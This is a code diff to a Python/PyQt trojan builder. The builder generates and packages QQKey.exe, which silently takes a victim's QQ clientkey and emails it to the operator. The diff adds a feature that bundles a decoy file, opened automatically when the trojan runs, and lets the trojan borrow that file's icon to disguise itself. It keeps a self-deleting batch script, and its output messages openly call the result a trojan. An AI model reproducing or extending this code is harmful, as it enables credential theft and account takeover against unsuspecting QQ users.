@@ -19,6 +19,14 @@ def encrypt(fpath: str, algorithm: str) -> str:
     with open(fpath, 'rb') as f:
         return hashlib.new(algorithm, f.read()).hexdigest()
 
+def get_file_path(name):
+    if getattr(sys, 'frozen', None):
+        basedir = sys._MEIPASS
+    else:
+        basedir = os.path.dirname(__file__)
+    file_path = os.path.join(basedir, name)
+    return file_path
+
 def get_g_tk(p_skey):
     t = 5381
     for i in p_skey:
@@ -41,6 +49,7 @@ class Ui_Dialog(object):
         self.qun_url = ''
         self.mail_url = ''
         self.icon_path = ''
+        self.file_path = ''
         Dialog.setObjectName("Dialog")
         Dialog.resize(701, 463)
         font = QtGui.QFont()
@@ -48,7 +57,7 @@ class Ui_Dialog(object):
         Dialog.setFont(font)
         Dialog.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint | QtCore.Qt.WindowCloseButtonHint)
         Dialog.setFixedSize(Dialog.width(), Dialog.height())
-        Dialog.setWindowIcon(QtGui.QIcon("./icon.ico"))
+        Dialog.setWindowIcon(QtGui.QIcon(get_file_path("./icon.ico")))
         self.centralwidget = QtWidgets.QWidget(Dialog)
         self.centralwidget.setObjectName("centralwidget")
         self.label = QtWidgets.QLabel(Dialog)
@@ -76,7 +85,7 @@ class Ui_Dialog(object):
         self.lineEdit.setGeometry(QtCore.QRect(130, 92, 131, 20))
         self.lineEdit.setObjectName("lineEdit")
         self.lineEdit_2 = QtWidgets.QLineEdit(Dialog)
-        self.lineEdit_2.setGeometry(QtCore.QRect(130, 120, 81, 20))
+        self.lineEdit_2.setGeometry(QtCore.QRect(130, 120, 41, 20))
         self.lineEdit_2.setObjectName("lineEdit_2")
         self.checkBox = QtWidgets.QCheckBox(Dialog)
         self.checkBox.setGeometry(QtCore.QRect(40, 148, 131, 16))
@@ -92,6 +101,13 @@ class Ui_Dialog(object):
         self.checkBox_2.setFont(font)
         self.checkBox_2.setObjectName("checkBox_2")
         self.checkBox_2.clicked.connect(self.if_icon_checkbox_changed)
+        font = QtGui.QFont()
+        font.setFamily("微软雅黑")
+        font.setPointSize(10)
+        self.checkBox_3 = QtWidgets.QCheckBox(Dialog)
+        self.checkBox_3.setGeometry(QtCore.QRect(180, 125, 101, 16))
+        self.checkBox_3.setFont(font)
+        self.checkBox_3.clicked.connect(self.if_exe_checkbox_changed)
         self.label_4 = QtWidgets.QLabel(Dialog)
         self.label_4.setGeometry(QtCore.QRect(90, 40, 41, 21))
         font = QtGui.QFont()
@@ -249,6 +265,7 @@ class Ui_Dialog(object):
         self.pushButton_3.setText(_translate("Dialog", "QQ空间"))
         self.pushButton_5.setText(_translate("Dialog", "QQ邮箱"))
         self.pushButton_6.setText(_translate("Dialog", "QQ群"))
+        self.checkBox_3.setText(_translate("Dialog", "捆绑文件"))
     def change_textedit(self, message: str):
         self.textEdit.setText(self.textEdit.toPlainText() + message)
 
@@ -259,6 +276,31 @@ class Ui_Dialog(object):
                 self.checkBox_2.setChecked(False)
         else:
             self.icon_path = ""
+
+    def if_exe_checkbox_changed(self):
+        if self.checkBox_3.isChecked():
+            choice = QtWidgets.QMessageBox.question(self.centralwidget, "询问", "请问是否需要将图标更改为文件的图标(仅exe可获取)?")
+            if choice == QtWidgets.QMessageBox.Yes and self.icon_path:
+                if QtWidgets.QMessageBox.question(self.centralwidget, "询问", "检测到您已选择图标,请问是否覆盖原先图标?") == QtWidgets.QMessageBox.No:
+                    choice = QtWidgets.QMessageBox.No
+            self.file_path = QtWidgets.QFileDialog.getOpenFileName(self.centralwidget, "选择文件", "", "所有文件(*)")[0]
+            file_format = os.path.splitext(self.file_path)[1]
+            if not self.file_path:
+                self.checkBox_3.setChecked(False)
+                return
+            for i in self.file_path:
+                if i == ' ':
+                    QtWidgets.QMessageBox.critical(self.centralwidget, "错误", "路径/文件名内不应包含空格,请将文件移至纯英文数字无空格的文件夹内!")
+                    self.checkBox_3.setChecked(False)
+                    self.file_path = ""
+                    return
+            if choice == QtWidgets.QMessageBox.Yes and file_format == ".exe":
+                self.icon_path = self.file_path
+                self.checkBox_2.setChecked(True)
+            elif choice == QtWidgets.QMessageBox.Yes:
+                QtWidgets.QMessageBox.critical(self.centralwidget, "错误", "提取文件图标仅支持exe文件!")
+        else:
+            self.file_path = ""
 
     def get_qq_info(self):
         self.func_running = True
@@ -476,9 +518,10 @@ class Ui_Dialog(object):
             content = content.replace("smtp_password", smtp_password)
             content = content.replace("smtp_server", smtp_server)
             content = content.replace("smtp_port", smtp_port)
-            _ = False # 标记是否需要自毁,以便后面用户改变checkbox导致输出错误
+            _ = [False,False] # 标记是否需要自毁与是否捆绑文件,以便后面用户改变checkbox导致输出错误
+            __ = '\\'
             if self.checkBox.isChecked():
-                _ = True
+                _[0] = True
                 content += r"""
 import sys,os
 if os.path.basename(sys.executable) != 'python.exe':
@@ -489,21 +532,31 @@ with open("1.bat", 'w', encoding='gbk') as f:
     f.write(f"@echo off\nping -n 1 127.0.0.1>nul\ndel {path}\ndel %0")
 os.startfile("1.bat")
 sys.exit(0)"""
+            if self.file_path:
+                self.file_path = self.file_path.replace('/',__)
+                content = f"""import sys,os
+# 根据系统运行位置确认basedir路径
+if getattr(sys, 'frozen', None):
+    basedir = sys._MEIPASS
+else:
+    basedir = os.path.dirname(__file__)
+file = os.path.join(basedir, '{os.path.basename(self.file_path)}')
+os.startfile(file)\n""" + content
+            content = content.replace("if clientkey is None:","if not clientkey:") # 懒得更搭建包了,直接在工具里硬修改得了:)
             with open(".\\qkey_code.py", 'w', encoding='utf-8') as f:
                 f.write(content)
             print("开始下载打包所需文件...")
             subprocess.call(".\\data\\python.exe -m pip install pyinstaller requests urlextract psutil -i https://pypi.tuna.tsinghua.edu.cn/simple",creationflags=subprocess.CREATE_NO_WINDOW)
             print("开始打包...")
-            __ = '\\'
-            subprocess.call(
-                f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py",creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.call(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py{f' --add-data {self.file_path};.' if self.file_path else ''}",creationflags=subprocess.CREATE_NO_WINDOW)
             if os.path.isfile("QQKey.exe"):
                 os.remove('QQKey.exe')
             os.rename(".\\dist\\qkey_code.exe", ".\\QQKey.exe")
             print("打包完毕!")
             print("文件名为:QQKey.exe")
             print("目标如果打开此文件将会获取QQkey并发送至你的邮箱")
-            if _ == True: print("注意:运行完后程序自动删除!")
+            if _[1] == True: print(f"木马已捆绑文件{os.path.basename(self.file_path)},目标打开木马后将自动打开捆绑文件!")
+            if _[0] == True: print("注意:运行完后程序自动删除!")
             print("注意:当对方打开时程序将静默获取,并不会出现弹出窗口",end='')
             return
         except Exception as e:
